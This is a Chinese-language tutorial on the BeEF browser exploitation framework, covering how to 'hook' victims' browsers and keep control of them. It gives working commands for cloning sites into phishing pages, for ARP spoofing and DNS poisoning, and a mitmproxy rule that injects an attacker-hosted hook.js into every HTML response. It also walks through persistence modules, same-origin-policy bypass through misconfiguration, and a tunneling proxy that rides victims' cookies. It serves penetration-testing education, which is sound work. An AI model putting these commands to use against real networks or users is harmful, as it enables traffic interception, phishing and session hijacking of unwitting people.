<p>可以通过两种方法来使用CSP， 一种是配置WEB服务器返回Content-Security-Policy 首部,  第二种是使用<meta>元素。</p>
<p>下面给个典型的例子：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'   //网站管理者想要页面的所有内容（js, 图片, css等资源）均来自站点的同一个源 (不包括其子域名)</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self' "&gt;</span><br></pre></td></tr></table></figure>
<p>上面的CSP指令，会告诉浏览器，这个页面只加载同源（还记得同源策略吗）的资源，这样就可以防御对于需要加载异源的BeEF攻击了。CSP也不是一定就安全的，网上也有一些文章在讨论如何绕过CSP。感兴趣的读者可以自己去找来看。</p>
<h2 id="使用有安全漏洞的Web应用"><a href="#使用有安全漏洞的Web应用" class="headerlink" title="使用有安全漏洞的Web应用"></a>使用有安全漏洞的Web应用</h2><p>这种方法主要是通过Web漏洞来修改网页的内容，让其包含恶意的代码，对于BeEF来讲就是在网页中加入勾子。利用Web应用可以涉及各种攻击，这里就不展开讨论了。</p>
<h2 id="使用广告网路"><a href="#使用广告网路" class="headerlink" title="使用广告网路"></a>使用广告网路</h2><p>现在的网络广告满街是了，打开一个普通网站就有一堆的广告。一旦广告网络被用来传播恶意的代码，那么就是很可怕的一件事情了。要使用这个方法就必须到广告商哪里注册，并且需要花钱。但是效果是显著的，一旦广告上线，就会有一大批的小僵尸了。</p>
<h2 id="使用社会工程攻击"><a href="#使用社会工程攻击" class="headerlink" title="使用社会工程攻击"></a>使用社会工程攻击</h2><p>社会工程的攻击方法多种多样。在使用BeEF框架攻击时，我们首要的目的是让目标浏览器执行初始化的代码（勾子）。所以这里只介绍诱导用户访问欺骗性网站这种类型的社会工程攻击方法。这种方法一般分为两个步骤，第一步是构建网站，第二步是放出诱饵。</p>
<h3 id="构建网站"><a href="#构建网站" class="headerlink" title="构建网站"></a>构建网站</h3><p>构建网站常用的有两个方法：</p>
<blockquote>
<p>​        1.自己从头开始构建网站。效果最好，成本也最高</p>
<p>​        2.克隆已有站点。最常使用</p>
</blockquote>
<p>克隆站点有几个方法，下面介绍一下。</p>
<p>第一种方法是最简单的，就是直接到网站下载它的页面。</p>
<p>第二种可以使用wget来克隆：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wget -k -p -nH -N http://xxxweb.com</span><br><span class="line"></span><br><span class="line">#各参数说明</span><br><span class="line"><span class="deletion">-k     把已下载文件中的所有链接都转换为本地引用，不再依赖原始或在线内容</span></span><br><span class="line"><span class="deletion">-p     下载所有必要文件，确保离线可用，包括图片和样式表</span></span><br><span class="line"><span class="deletion">-nH    禁止把文件下载到以主机名为前缀的文件夹中</span></span><br><span class="line"><span class="deletion">-N     启用文件的时间戳，以匹配来源的时间戳</span></span><br><span class="line"></span><br><span class="line">#下面两项可选</span><br><span class="line"><span class="deletion">-r     递归下载</span></span><br><span class="line"><span class="deletion">-l     指定最大的递归深度，0为无限。</span></span><br></pre></td></tr></table></figure>
<p>克隆完成后需要在页面中加入勾子的URL。</p>
<p>第三种方法是使用BeEF的社会工程扩展中的Web克隆功能，这个功能默认会在被克隆的网站内容中注入勾子。下面在kali下演示一下怎么使用。</p>
<p>先进入beef的目录/usr/share/beef-xss(直接以beef-xss或者systemctl来启动beef,是无法看到API的token的)，接着执行./beef,就会如下图：</p>
<p><img src="/img/posts/15303361952889.png" alt="15.png"></p>
<p>接着使用BeEF的REST风格API来克隆：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">"Content-Type: application/json; charset=UTF-8"</span> -d '&#123;<span class="string">"url"</span>:<span class="string">"&lt;URL of site to clone&gt;"</span>, <span class="string">"mount"</span>:<span class="string">"&lt;where to mount&gt;"</span>&#125;' -X POST http:<span class="string">//</span>&lt;BeEFURL&gt;<span class="string">/api/seng/clone_page</span>?token=&lt;token&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">##&lt;URL of site to clone&gt; 是你要克隆页面的URL</span></span><br><span class="line"><span class="comment">##&lt;where to mount&gt; 是指克隆的页面你想放在BeEF服务器的那里</span></span><br><span class="line"><span class="comment">##&lt;token&gt; API 的token</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#下面是克隆https://www.baidu.com首页的代码</span></span><br><span class="line">curl -H <span class="string">"Content-Type: application/json; charset=UTF-8"</span> -d '&#123;<span class="string">"url"</span>:<span class="string">"https://www.baidu.com"</span>,<span class="string">"mount"</span>:<span class="string">"/testclone"</span>&#125;' -X POST http:<span class="string">//127.0.0.1</span><span class="function">:3000</span>/api/seng/clone_page?token=60451a5e3b9716e4ea8a8131a1763a4d22aad7b3</span><br></pre></td></tr></table></figure>
<p>运行上面的代码可以看到BeEF控制台会有如下输出：</p>
<p><img src="/img/posts/15303375846842.png" alt="16.png"></p>
<p>接着试试访问<a href="http://127.0.0.1:3000/testclone" target="_blank" rel="noopener">http://127.0.0.1:3000/testclone</a>，你会看到是百度的首页。</p>
<p><img src="/img/posts/15303377429675.png" alt="17.png"></p>
<p>这个页面是有勾子的，访问这个页面，也意味着该浏览器已经成为了僵尸了。这个页面的文件在/usr/share/beef-xss/extensions/social_engineering/web_cloner/cloned_pages下，名为<a href="http://www.baidu.com_mod" target="_blank" rel="noopener">www.baidu.com_mod</a>   的文件,可以修改定制或者把它复制到别的主机中做钓鱼页面。</p>
<p>除了这三种克隆的方法，还有很多其他的方法。笔者推荐使用BeEF的克隆功能，并且做一些改动，比如增加一个错误页面。</p>
<h3 id="放出诱饵"><a href="#放出诱饵" class="headerlink" title="放出诱饵"></a>放出诱饵</h3><p>现在欺骗性的网站已经有了，那么接下来就是要让目标去访问它了。方法有很多，下面介绍三种：</p>
<blockquote>
<p>​        1. 发钓鱼邮件</p>
<p>​        2. 物理诱惑</p>
<p>​        3. QR码</p>
</blockquote>
<p>发钓鱼邮件就简单了，直接把有勾子页面的URL发给目标就可以。最好模糊一下URL，比如缩短URL、重定向URL、使用@等。发邮件的最大问题在于用什么来发，最好的方法是拥有自己的主机和域名，这样就可以设置一个邮件系统，同时也可以在DNS记录中配置SPF。物理诱惑可以是一个简单U盘，U盘里面有一个html文件，这个文件自然是指向有勾子的页面的。最后的QR码就是二维码，这个是比较好的办法，足够隐蔽。</p>
<h2 id="使用中间人攻击"><a href="#使用中间人攻击" class="headerlink" title="使用中间人攻击"></a>使用中间人攻击</h2><p>这种方法有一个前提，就是必须与目标在同一个网络。可以窃听网络上的数据，并修改。比如同一局域网，或者使用aircrack-ng等工具来破解wifi密码，然后使用密码登录到同一个wifi网络。使用中间人攻击来达到BeEF框架的初始化攻击主要有以下两种方法：</p>
<blockquote>
<p>​          1.浏览器中间人攻击</p>
<p>​          2.DNS下毒</p>
</blockquote>
<h3 id="浏览器中间人攻击"><a href="#浏览器中间人攻击" class="headerlink" title="浏览器中间人攻击"></a>浏览器中间人攻击</h3><p>浏览器中间人攻击是与传统中间人攻击类似的一种方式，只不过完全发生在应用层的http协议上。浏览器中间人攻击就是窃取/修改网络中的http协议。而对于BeEF框架来说自然是要在html页面中加入勾子。笔者分别使用了ettercap， mitmproxy来测试，发现ettercap的测试结果不太理想，所以下面给出mitmproxy的测试方法。kali默认已经安装mitmproxy，mitmproxy是一个中间人攻击的框架（看名字就可以知道了）。</p>
<p>测试环境：</p>
<table>
<thead>
<tr>
<th style="text-align:left">主机</th>
<th style="text-align:left">身份</th>
<th style="text-align:left">ip</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">kali</td>
<td style="text-align:left">攻击方</td>
<td style="text-align:left">192.168.8.219</td>
</tr>
<tr>
<td style="text-align:left">windows7</td>
<td style="text-align:left">受害方</td>
<td style="text-align:left">192.168.8.193</td>
</tr>
<tr>
<td style="text-align:left">网关/家用路由</td>
<td style="text-align:left">受害方</td>
<td style="text-align:left">192.168.8.1</td>
</tr>
</tbody>
</table>
<p>先开启beef的服务</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> beef-xss.service</span><br></pre></td></tr></table></figure>
<p>接着开启ip转发功能</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">1</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/net/i</span>pv4<span class="regexp">/ip_forward</span></span><br></pre></td></tr></table></figure>
<p>使用iptables设置端口重定向</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iptables -t<span class="built_in"> nat </span>-A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080</span><br><span class="line"></span><br><span class="line"><span class="comment">##下面这句是要mitmproxy来透明代理https协议（443）。</span></span><br><span class="line"><span class="comment">##这是需要条件的，需要受害方的浏览器中信任mitmproxy的CA证书，这基本是不可能的。所以建议下面的这一句不用运行</span></span><br><span class="line"></span><br><span class="line">iptables -t<span class="built_in"> nat </span>-A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080</span><br></pre></td></tr></table></figure>
<p>笔者建议在玩中间人攻击时不要对https出手，因为很难成功，而且一旦失败（大部分时候，sslstrip已经没那么好用了），会导致受害方无法访问使用https的网站。容易被发现。</p>
<p>启动mitmproxy, 并设置在所有html respond 数据中插入beef勾子</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy --anticache --showhost -p 8080 --mode transparent -R ":~s:<span class="tag">&lt;/<span class="name">body</span>&gt;</span>:<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://192.168.8.219:3000/hook.js'</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span>"</span><br></pre></td></tr></table></figure>
<p><img src="/img/posts/15306063232303.png" alt="18.png"></p>
<p>运行上面这句会启动mitmproxy, 并把所有html respond 数据中把  替换成 &lt;script src=’<a href="http://192.168.8.219:3000/hook.js" target="_blank" rel="noopener">http://192.168.8.219:3000/hook.js</a>‘ type=’text/javascript’&gt;。</p>
<p>运行之后会是这样的：</p>
<p><img src="/img/posts/15306063511990.png" alt="19.png"></p>
<p>因为现在还没有数据经过mitmproxy，所以是空白的</p>
<p>下面要arp欺骗网关（192.168.8.1） 和 windows7(192.168.8.193),  欺骗之后 windows7 的流量都会到kali上。而上面的iptables 已经设置所有符合条件的流量（是tcp协议， 且是目标端口是80的数据包）都会转到mitmproxy监听的8080端口。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">arpspoof</span> <span class="selector-tag">-i</span> <span class="selector-tag">wlan0</span> <span class="selector-tag">-t</span> 192<span class="selector-class">.168</span><span class="selector-class">.8</span><span class="selector-class">.193</span> 192<span class="selector-class">.168</span><span class="selector-class">.8</span><span class="selector-class">.1</span></span><br><span class="line"><span class="selector-tag">arpspoof</span> <span class="selector-tag">-i</span> <span class="selector-tag">wlan0</span> <span class="selector-tag">-t</span> 192<span class="selector-class">.168</span><span class="selector-class">.8</span><span class="selector-class">.1</span> 192<span class="selector-class">.168</span><span class="selector-class">.8</span><span class="selector-class">.193</span></span><br></pre></td></tr></table></figure>
<p>运行完上面两句之后，就可以开始了。</p>
<p>用windows下的firefox 访问freebuf：</p>
<p><img src="/img/posts/15306081778960.png" alt="20.png"></p>
<p>mitmproxy的控制台会有大量的输出， 所有的http流量都有记录。</p>
<p><img src="/img/posts/15306082449070.png" alt="21.png"></p>
<p>这时候，windows的firefox 已经被钩住了， 查看一下beef 的管理界面：</p>
<p><img src="/img/posts/15306083093137.png" alt="23.png"></p>
<h3 id="DNS下毒"><a href="#DNS下毒" class="headerlink" title="DNS下毒"></a>DNS下毒</h3><p>DNS下毒简单来说就是修改DNS记录。一般情况下要实现DNS下毒是需要拿下DNS服务器，然后修改DNS记录。或者修改目标主机的本地host文件。使用中间人攻击技术，只需要使用ARP欺骗技术冒充DNS服务器，接受DNS的请求，并返回恶意的DNS解析应答就可以了。</p>
<p>ettercap带有一个dns_spoof模块，可以自动做到DNS下毒。可以通过修改/etc/ettercap/etter.dns来添加恶意的DNS记录。下图是添加了freebuf的DNS记录。</p>
<p><img src="/img/posts/15306246582324.png" alt="24.png"></p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -T -Q -P dns_spoof -M <span class="string">arp:</span>remote -i wlan0 <span class="regexp">/target ip/</span><span class="regexp">/ /</span>gateway ip<span class="comment">//</span></span><br></pre></td></tr></table></figure>
<p>target ip 是目标的ip。gateway ip是局域网的网关，正确来说应该是DNS服务器的ip，在局域网中大多都会把网关做为DNS服务器，可以查看/etc/resolv.conf, 里面就是DNS服务器的地址（这个地址必须是同一局域网）。运行上面语句, 当target主机查询freebuf.com的ip时，就会有如下输出：</p>
<p><img src="/img/posts/15306241135720.png" alt="25.png"></p>
<p>配合上面社会工程学克隆网站的技术，可以把用户诱导到有钩子的网页。</p>
<p><strong>接下来就是介绍如何让BeEF持续控制僵尸们了。</strong></p>
<h2 id="持续化控制"><a href="#持续化控制" class="headerlink" title="持续化控制"></a>持续化控制</h2><p>BeEF在获得对僵尸们的初始化控制后，首要的任务是想办法持续化控制它们。这是因为初始化控制一般只是发生在单个或多个页面内（勾子一般只注入到一个页面或多个页面），一旦用户离开/关闭这个页面，或者关闭浏览器。那么BeEF就失去了控制权，所以需要使用一些方法来尽可能的维持控制，为后面的攻击争取更多时间。不难想象，使用BeEF来攻击浏览器是一件争分夺秒的事情。持续化控制也被分为两个方面。一方面是持久通信，也就是BeEF服务器和僵尸之间通信技术的选择，越高级的通信技术，速度也快。另一方面是持久存续，也就是想办法使用户尽可能的呆在有勾子的页面。</p>
<h2 id="持久通信"><a href="#持久通信" class="headerlink" title="持久通信"></a>持久通信</h2><p>为了让BeEF服务器与僵尸之间快速的通信（全双工），BeEF提供三种通信的技术。分别是XMLHttpRequest 、WebSocket 、WebRTC。三种方法各有优缺点，下面一一介绍。</p>
<h3 id="使用跨域资源共享"><a href="#使用跨域资源共享" class="headerlink" title="使用跨域资源共享"></a>使用跨域资源共享</h3><p>在介绍通信之前，有必要提一下CORS（跨域资源共享）。CORS扩展了一下SOP（同源策略），可以允许页面读取其它来源的HTTP响应。对于被勾连的页面来说，BeEF服务器无疑就是一个异源。为了让浏览器在勾连的页面运行BeEF发送的命令，就需要使用CORS。</p>
<p>BeEF服务器通过在每一个HTTP响应中都包含以下的HTTP首部来实现这一点：</p>
<figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##允许来自任何地方的跨域POST和GET请求</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: *</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span>: POST, GET</span><br></pre></td></tr></table></figure>
<p>BeEF服务器返回上面的语句，那么浏览器就可以读取其全部HTTP响应。如果没有包含上面的CORS首部，SOP就会阻止读取BeEF服务器返回的数据。这里需要提醒一下，浏览器只是无法跨域读取数据，但是可以发送数据的。也就是说我们可以通过BeEF来操作浏览器向任何域发送HTTP请求，但是不一定能读取返回的HTTP响应。这一点很重要，后面的一些攻击就是用了这一特性。</p>
<h3 id="使用XMLHttpRequest通信"><a href="#使用XMLHttpRequest通信" class="headerlink" title="使用XMLHttpRequest通信"></a>使用XMLHttpRequest通信</h3><p>这是BeEF的默认通信技术。原因很简单，几乎所有的浏览器都支持这种技术，兼容性最好，但它也是三种技术中最慢的。读者如果有兴趣可以使用Burp Suite来截取一下BeEF与僵尸的交互数据，就可以更清晰的看到它们的交互过程了。</p>
<h3 id="使用WebSocket通信"><a href="#使用WebSocket通信" class="headerlink" title="使用WebSocket通信"></a>使用WebSocket通信</h3><p>WebSocket正如其名，是Web中socket。WebSocket协议是一种非常快 、全双工的通信技术。它比XMLHttpRequest要快。但是某些旧的浏览器是不支持的，IE从10开始支持，Firefox从16.0开始支持，chrome从23.0开始支持。BeEF默认是没有开WebSocket的，需要设置一下。</p>
<p>找到beef的配置文件,kali下是/usr/share/beef-xss/config.yaml, 找到下面选项，并做如下修改。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Prefer WebSockets over XHR-polling when possible.</span></span><br><span class="line"><span class="attr">        websocket:</span></span><br><span class="line"><span class="attr">            enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>重启beef服务器，就生效了。BeEF会根据浏览器是否支持WebSocket，如果支持，那么以后就使用WebSocket来通信。如果不支持，那么就使用XMLHttpRequest来通信。即BeEF会自动选择通信技术，优先选择快速的技术。</p>
<h3 id="使用WebRTC"><a href="#使用WebRTC" class="headerlink" title="使用WebRTC"></a>使用WebRTC</h3><p>网页实时通信（Web Real-Time Communication）是一个支持网页浏览器进行实时语音对话或视频对话的技术。这个技术是最快的，但要较新的浏览器才支持。笔者查看了一下配置文件/usr/share/beef-xss/extensions/webrtc/config.yaml,发现好像需要server才行：</p>
<p><img src="/img/posts/15307205055264.png" alt="26.png"></p>
<p>查看官方的文档也没有介绍，笔者也不了解WebRTC这项技术，没有使用成功。所以索性把它关了，enable: true 变 enable: false。</p>
<p>除了这三种技术之外还有DNS隧道技术，这是比较隐蔽的通信方式，但是不太稳定。所以这里就不介绍了。实际上有WebSocket技术就已经足够快速了。当然还有一个硬伤，那就是网速，这是无可奈何的了。</p>
<h2 id="持久存续"><a href="#持久存续" class="headerlink" title="持久存续"></a>持久存续</h2><p>选好了通信的渠道，那么接下来要考虑一下如何在用户离开/关闭页面或者关闭浏览器时依旧保持控制。BeEF给出了四个解决的方法，分别是利用IFrame 、窗口事情处理函数 、动态底层弹出窗口 、以及浏览器中间人技术。单独使用任何一种技术或组合使用这些技术，可以实现对被勾连浏览器的持久控制。</p>
<h3 id="使用IFrame内嵌框架"><a href="#使用IFrame内嵌框架" class="headerlink" title="使用IFrame内嵌框架"></a>使用IFrame内嵌框架</h3><p>IFrame是HTML中的一个标签，可以创建包含另外一个文档的内联框架。为了持久的控制，可以创建一个全屏（整个浏览器）的IFrame来把页面放进去。BeEF的作者建议如果想持久化，内嵌框架是首选方案，原因如下：第一，可以完全控制内嵌框架的DOM内容。第二，内嵌框架主要用于在当前页面嵌入其他文档的事实，为持久化提供了直接了当的方法。实际操作一下会更清晰这个方法：</p>
<p>确保开启了BeEF服务器。笔者用freebuf来做测试，使用Burp拦截Response并在其中插入以下语句。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://BeEF server:3000/hook.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到初始化控制后，接下来就是使用IFrame内嵌框架技术了，对应的功能模块是Persistence –&gt; Create foreground iFrame, 这个模块不需要任何参数，点击Execute 运行就可以了。</p>
<p><img src="/img/posts/15307727792222.png" alt="27.png"></p>
<p>执行后，僵尸浏览器这边是没有任何异常的。</p>
<p><img src="/img/posts/15307557969344.png" alt="29.png">当用户点击新的页面，代码才会执行，会把新的页面放在一个%100宽度，%100高度的iFrame中。下面是笔者点击了第一个新闻后的效果：</p>
<p><img src="/img/posts/1530755919915.png" alt="28.png"></p>
<p>看上图，可以发现使用iFrame的一些缺点。第一是URL是不会变的，会保持在被钩住的那个页面的URL。第二是经常出现混乱，点击无效等异常（经笔者测试有些网站运行很好，有些就会出现。一些不会使用js动态渲染页面，不会使用ajax动态更新内容的页面会运行的很好），容易被用户察觉。第三个是，如果页面返回的HTTP响应中包含X-Frame-Options等首部，那么内嵌框架的技术就会失效。鉴于以上缺点，笔者个人不推荐这种技术作为首选持久控制的技术。笔者推荐使用下面的技术。</p>
<h3 id="使用浏览器中间人攻击"><a href="#使用浏览器中间人攻击" class="headerlink" title="使用浏览器中间人攻击"></a>使用浏览器中间人攻击</h3><p>还记得上一章说的浏览器中间人攻击吗？上一章介绍的是要在同一个网络内，并通过mitmproxy来截取/修改http的内容。而这一次不需要在同一个网络内，直接在被勾连浏览器中用js代码发送/截取http的内容，然后展现给用户。常规页面与MitB（浏览器中间人攻击）中毒页面的区别在于，MitB会异步加载资源，同时保持勾连活动。对于用户来说一切都好像在正常页面中操作一样，很难察觉到有异常。这里要注意一下，如果用户单击了跨域链接，MitB会在浏览器中打开一个新的标签页，并把响应的内容放在新的标签页。下面实际演示一下：</p>
<p>依然使用freebuf来做实验， 在得到初始控制后。接下来使用MitB技术了，对应的模块在Persistence –&gt; Man-In-The-Browser，这个模块同样不需要参数，点击就可运行。</p>
<p><img src="/img/posts/15307874182239.png" alt="30.png"></p>
<p>僵尸浏览器这边同样没有任何异常的。</p>
<p><img src="/img/posts/15307875166847.png" alt="33.png"></p>
<p>打开第一个新闻。分别查看一下僵尸浏览器和BeEF管理页面有什么变化。</p>
<p><img src="/img/posts/1530787592420.png" alt="32.png"></p>
<p><img src="/img/posts/15307876166124.png" alt="31.png"></p>
<p>可以看到对于用户来说已经转到新页面。而实际上，勾子依然是存在的，浏览器依然保持着和BeEF服务器的联系。当然MitB技术也是有缺点的。第一个是无法加载图片。第二个缺点是像freebuf网站最上面由js做成的导航菜单，如果用户点击导航菜单中的一项，那么会导致页面跳转到新页面，BeEF将失去控制权。这是由于MitB实现原理的缺陷导致的。但是相对来说它还是比IFrame内嵌框架要好用些。</p>
<h3 id="窗口事情处理函数"><a href="#窗口事情处理函数" class="headerlink" title="窗口事情处理函数"></a>窗口事情处理函数</h3><p>简单来说，就是在用户点击关闭当前页面或者关闭浏览器按钮时，弹出一个窗口，来问用户是否要离开，如果用户选择确定要离开，那么就继续弹出窗口，不断的重复。在BeEF中对应的模块是Persistence –&gt; Confirm Close Tab，但是现代的浏览器已经不允许这样反复的弹出窗口了，最多只允许执行一次。笔者在测试时，发现不同浏览器会有不同的反应。firefox和chrome只有在关闭浏览器时才会有弹窗，360浏览器在关闭当前页面或关闭浏览器时都会有弹窗。QQ是最好玩的了，点击关闭当前页面之后，它会打开一个新标签页去加载BeEF服务器的demo页面。搜狗全部都没有弹窗。上面提及的浏览器都是最新版。旧版IE会不停的弹出提示窗口。这种方法虽然最多也只能多维持几秒，但是几秒也是值得争取的。所以笔者推荐把它和上面两种方法的其中一种一起组合使用，这里要注意一下前面介绍的两种方法（MitB和iFrame）是不能同时使用的。</p>
<h3 id="动态底层弹出窗口"><a href="#动态底层弹出窗口" class="headerlink" title="动态底层弹出窗口"></a>动态底层弹出窗口</h3><p>这项技术是创建一个新的窗口，然后加载BeEF的示例文件demo/plain.html，这样就可以拥有另一个新的初始化控制了。现代浏览器默认阻止弹出窗口并警告用户弹出窗口已被阻止。但是，对于某些用户启动的事件（例如单击页面），会绕过此检查。所以可以使用点击劫持，当用户点击页面时，就会触发事件，打开新的窗口。这选技术对应的模块是Persistence –&gt; Create Pop Under。虽然它的名字中有under，但是创建出来的窗口却是在前面的。</p>
<p><img src="/img/posts/15308059323751.png" alt="34.png"></p>
<p>不同的浏览器会有不同的反应，IE8， Firefox， 360， chrome 会在右下脚创建一个小窗口。</p>
<p><img src="/img/posts/15308066333601.png" alt="35.png"></p>
<p>而QQ，搜狗浏览器则会打开一个新的标签页。这里就不贴图了，读者可以自行测试一下。</p>
<p>使用这个技术有两个缺点。第一个缺点很明显，那就是会被察觉，用户可以看见新的窗口或新的标签页，警觉性高的用户会直接关闭。第二个是新打开窗口加载的是BeEF服务器的demo页面，也就是说已经和一开始被勾住的页面是不同源了，这会影响到后面的一些攻击。所以这个技术算是最后手段，或者作为保底的手段。</p>
<h3 id="其它模块"><a href="#其它模块" class="headerlink" title="其它模块"></a>其它模块</h3><p>最后提一下其它的模块。Hijack Opener Window 模块与iFrame类似，此模块滥用window.location.opener来劫持打开的窗口，将其替换为BeEF挂钩和包含引用网页。JSONP Service Worker 模块，笔者不清楚这一项技术。按模块中的描述是利用JSONP端点中的未过滤回调参数，以确保每次用户重新访问域时BeEF将挂钩。</p>
<p><strong>从这一章开始，正式进入了攻击阶段。BeEF提供了大量的攻击模块，可以直接使用。除了已有的模块，BeEF还提供了API，可以使用API来自行开发新的攻击模块。这一章，要介绍如何绕过同源策略，还会介绍BeEF的一个强大的功能Tunneling Proxy。</strong></p>
<h2 id="绕过同源策略"><a href="#绕过同源策略" class="headerlink" title="绕过同源策略"></a>绕过同源策略</h2><p>笔者在第一章就已经介绍了SOP（同源策略），SOP把拥有相同主机名 、协议和端口的页面视为同一来源。不同来源的资源之间交互是受到限制的。因为SOP的存在，BeEF只能对被勾子钩住的页面所在域进行操作。如果有办法绕过SOP，那么无疑会使攻击面放大。</p>
<p>绕过SOP可从两方面入手。第一个是从浏览器本身和插件的漏洞入手，一些旧版的浏览器曾被发现有绕过SOP的漏洞，旧版的插件也有类似的情况（JAVA，Adobe Flash等）。由于笔者自身能力限制，无法介绍这一方面的相关内容，读者可以自行查阅相关信息。第二个是Web的开发者错误的设置导致，下面介绍这一方面。</p>
<h3 id="SOP与DOM"><a href="#SOP与DOM" class="headerlink" title="SOP与DOM"></a><strong>SOP与DOM</strong></h3><p>js或其它协议访问DOM时，也是需要遵守SOP。但是有时候子域之间需要相互访问，比如要login.site.com的代码访问admin.site.com中的表单。那么开发人员可以通过设置document.domain属性来达到目的。以login.site.com和admin.site.com来举个例子。为了使login.site.com访问admin.site.com的表单，那么开发人员会在admin.site.com的页面中加入：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">document.domian</span> = <span class="string">"site.com"</span></span><br></pre></td></tr></table></figure>
<p>admin.site.com页面有了这一句js语句，那么site.com下所有页面的js都可以访问admin.site.com页面的DOM了。如果test.site.com中有XSS漏洞，那么攻击者可以使用BeEF钩住它，然后接着来攻击admin.site.com。这样不经意之间就会放宽了SOP，扩大了BeEF的攻击面了。</p>
<h3 id="SOP与CORS"><a href="#SOP与CORS" class="headerlink" title="SOP与CORS"></a>SOP与CORS</h3><p>还记得上一章提过的跨域资源共享（ CORS）吗？跨站请求可以正常发起，但是因为SOP的缘故，返回结果会被浏览器拦截。CORS机制允许进行跨域访问。如果开发者设置错误，这也会使BeEF的攻击面扩大。举个例子，为了使user.site.com访问login.site.com的资源，开发人员可能会在login.site.com的服务器设置返回以下响应首部：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *<span class="selector-class">.site</span><span class="selector-class">.com</span></span><br><span class="line">Access-Control-Allow-Methods: OPTIONS, GET, POST</span><br></pre></td></tr></table></figure>
<p>因为有上面的首部，所以会导致site.com下的所有子域都可以访问login.site.com的资源（浏览器不会拦截）。如果test.site.com中有XSS漏洞，那么攻击者可以使用BeEF钩住它，然后接着来攻击login.site.com。这样不经意之间就会放宽了SOP，扩大了BeEF的攻击面了。</p>
<h2 id="Tunneling-Proxy"><a href="#Tunneling-Proxy" class="headerlink" title="Tunneling Proxy"></a>Tunneling Proxy</h2><p>前面讲了那么多理论，都是为后面的攻击做准备。这是第一个介绍的攻击模块，所以笔者挑了一个笔者个人认为BeEF中最为强大的武器之一：Tunneling Proxy。</p>
<p>简单来说Tuneling Proxy是把被钩住的浏览器作为一个代理，这项技术也被叫做浏览器代理。下面给出原理图：</p>
<p><img src="/img/posts/15310018649562.jpeg" alt="3.jpeg"></p>
<ol>
<li><p>攻击者向Hook-domain.com主页向隧道代理发送一个GET请求。</p>
</li>
<li><p>隧道代理接收到请求后，它解析收到的HTTP请求，将其转换成AJAX请求，然后通过上一章说介绍的通信技术（XMLHttpRequest或WebSocket）将该请求插入被勾连的浏览器要执行的后续JavaScript代码中。</p>
</li>
<li><p>被勾连的浏览器接收到数据后，会向Hook-domain.com的主页发出一个AJAX请求。由于是浏览器发出的请求，所以它会带上Hook-domain.com的Cookie一起发送。</p>
</li>
<li><p>Hooke-domain.com接到被勾连的浏览器的请求后，返会HTTP响应。响应的内容会被勾子截取，直接发送回给代理隧道。所以响应的内容不会在被勾连的浏览器中显示。</p>
</li>
</ol>
<p>5.响应的内容从被勾连的浏览器发送给代理隧道。</p>
<p>6.响应被发送回攻击者这里。</p>
